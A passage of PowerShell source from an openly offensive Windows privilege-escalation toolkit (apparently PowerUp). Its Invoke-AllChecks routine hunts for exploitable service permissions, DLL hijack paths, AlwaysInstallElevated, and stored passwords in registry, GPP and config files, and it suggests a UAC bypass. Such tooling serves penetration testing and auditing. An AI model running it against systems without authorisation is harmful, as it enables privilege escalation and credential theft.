        PS C:\> Invoke-AllChecks

        Runs all escalation checks and outputs a status report for discovered issues.

    .EXAMPLE

        PS C:\> Invoke-AllChecks -HTMLReport

        Runs all escalation checks and outputs a status report to SYSTEM.username.html
        detailing any discovered issues.
#>

    [CmdletBinding()]
    Param(
        [Switch]
        $HTMLReport
    )

    if($HTMLReport) {
        #$HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"

        ConvertTo-HTML -Fragment -Pre "<H1>PowerUp Report for $($Env:ComputerName) - $($Env:UserName)</H1>`n<div class='aLine'></div>" | Out-File -Append $HtmlReportFile
    }

    # initial admin checks

    "`n[*] Running Invoke-AllChecks"

    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

    if($IsAdmin){
        "[+] Current user already has local administrative privileges!"

        if($HTMLReport) {
            ConvertTo-HTML -Fragment -Pre "<H2>User Has Local Admin Privileges!</H2>" | Out-File -Append $HtmlReportFile
        }
    }
    else{
        "`n`n[*] Checking if user is in a local group with administrative privileges..."

        $CurrentUserSids = Get-CurrentUserTokenGroupSid | Select-Object -ExpandProperty SID
        if($CurrentUserSids -contains 'S-1-5-32-544') {
            "[+] User is in a local group that grants administrative privileges!"
            "[+] Run a BypassUAC attack to elevate privileges to admin."

            if($HTMLReport) {
                ConvertTo-HTML -Fragment -Pre "<H2> User In Local Group With Administrative Privileges</H2>" | Out-File -Append $HtmlReportFile
            }
        }
    }


    # Service checks

    "`n`n[*] Checking for unquoted service paths..."
    $Results = Get-ServiceUnquoted
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking service executable and argument permissions..."
    $Results = Get-ModifiableServiceFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Service File Permissions</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking service permissions..."
    $Results = Get-ModifiableService
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Modifiable Services</H2>" | Out-File -Append $HtmlReportFile
    }


    # DLL hijacking

    "`n`n[*] Checking %PATH% for potentially hijackable DLL locations..."
    $Results = Find-PathDLLHijack
    $Results = $Results | Where-Object {$_} | Select-Object ModifiablePath, "%PATH%", Permissions, IdentityReference
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
    }


    # registry checks

    "`n`n[*] Checking for AlwaysInstallElevated registry key..."
    if (Get-RegistryAlwaysInstallElevated) {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
        $Results = $Out

        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>AlwaysInstallElevated</H2>" | Out-File -Append $HtmlReportFile
        }
    }

    "`n`n[*] Checking for Autologon credentials in registry..."
    $Results = Get-RegistryAutoLogon
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
    }


    "`n`n[*] Checking for modifiable registry autoruns and configs..."
    $Results = Get-ModifiableRegistryAutoRun
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
    }

    # other checks

    "`n`n[*] Checking for modifiable schtask files/configs..."
    $Results = Get-ModifiableScheduledTaskFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Modifiable Schtask Files</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for unattended install files..."
    $Results = Get-UnattendedInstallFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Unattended Install Files</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for encrypted web.config strings..."
    $Results = Get-Webconfig | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Encrypted 'web.config' String</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
    $Results = Get-ApplicationHost | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Encrypted Application Pool Passwords</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for plaintext passwords in McAfee SiteList.xml files...."
    $Results = Get-SiteListPassword | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>McAfee's SiteList.xml's</H2>" | Out-File -Append $HtmlReportFile
    }
    "`n"

    "`n`n[*] Checking for cached Group Policy Preferences .xml files...."
    $Results = Get-CachedGPPPassword | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Fragment -Pre "<H2>Cached GPP Files</H2>" | Out-File -Append $HtmlReportFile
    }
    "`n"

    if($HTMLReport) {
        "[*] Report written to '$HtmlReportFile' `n"
    }
}


# PSReflect signature specifications
$Module = New-InMemoryModule -ModuleName PowerUpModule

$FunctionDefinitions = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @())
    (func advapi32 OpenProcessToken ([Bool]) @( [IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError)
)

# https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
$ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
    QueryConfig =           '0x00000001'
    ChangeConfig =          '0x00000002'
    QueryStatus =           '0x00000004'
    EnumerateDependents =   '0x00000008'
    Start =                 '0x00000010'
    Stop =                  '0x00000020'
    PauseContinue =         '0x00000040'
    Interrogate =           '0x00000080'
    UserDefinedControl =    '0x00000100'
    Delete =                '0x00010000'
    ReadControl =           '0x00020000'
    WriteDac =              '0x00040000'
    WriteOwner =            '0x00080000'
    Synchronize =           '0x00100000'
    AccessSystemSecurity =  '0x01000000'
    GenericAll =            '0x10000000'
    GenericExecute =        '0x20000000'
    GenericWrite =          '0x40000000'
    GenericRead =           '0x80000000'
    AllAccess =             '0x000F01FF'
} -Bitfield

$SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
    SE_GROUP_ENABLED =              '0x00000004'
    SE_GROUP_ENABLED_BY_DEFAULT =   '0x00000002'
    SE_GROUP_INTEGRITY =            '0x00000020'
    SE_GROUP_INTEGRITY_ENABLED =    '0xC0000000'
    SE_GROUP_MANDATORY =            '0x00000001'
    SE_GROUP_OWNER =                '0x00000008'
    SE_GROUP_RESOURCE =             '0x20000000'
    SE_GROUP_USE_FOR_DENY_ONLY =    '0x00000010'
} -Bitfield

$SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}

$TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']